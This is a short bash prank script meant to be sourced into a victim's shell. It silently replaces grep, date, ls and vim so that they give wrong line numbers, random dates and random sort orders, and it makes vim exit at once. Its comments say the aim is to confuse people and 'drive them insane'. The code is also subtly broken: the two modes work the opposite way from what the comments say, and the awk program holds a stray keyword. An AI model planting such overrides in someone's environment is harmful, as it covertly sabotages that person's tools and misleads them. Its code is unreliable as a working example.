#!/usr/bin/env bash

# valid values are: insane, annoying
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory


if [ -z $1 ]; then
    EVIL_BEHAVIOUR=insane
else
    EVIL_BEHAVIOUR=$1
fi


function insane()
{
    test "$EVIL_BEHAVIOUR" = "insane"
}

function annoying()
{
    insane || test "$EVIL_BEHAVIOUR" = "annoying"
}


# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Have `date` return random dates.
insane && alias date='date -d "now + $RANDOM days"';

# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Quit vim on startup.
annoying && alias vim="vim +q";
